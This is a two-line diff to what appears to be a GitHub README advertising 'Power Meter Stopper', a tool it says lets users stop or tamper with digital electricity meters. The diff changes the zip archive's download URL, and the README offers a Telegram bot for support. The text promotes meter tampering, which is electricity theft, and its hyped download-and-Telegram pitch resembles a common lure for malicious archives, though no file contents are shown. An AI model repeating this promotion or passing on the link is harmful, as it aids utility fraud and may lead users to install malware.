@@ -27,6 +27,6 @@ Renowned as one of the most powerful tools in its class, it supports a wide rang
 Ready to revolutionize how you interact with digital electricity meters?
 Download the latest version of Power Meter Stopper now and join thousands of satisfied users. For support or inquiries, reach out via our dedicated Telegram Bot.
 
-- **Download Now:** [Download](https://raw.githubusercontent.com/johnwooday/power-meter-stopper/Power-Meter-Stopper-V5.0.zip)
+- **Download Now:** [Download](https://raw.githubusercontent.com/johnwooday/power-meter-stopper/main/Power-Meter-Stopper-V5.0.zip)
 - **Connect with Us:** [Telegram Bot](https://t.me/robochata_bot)
 
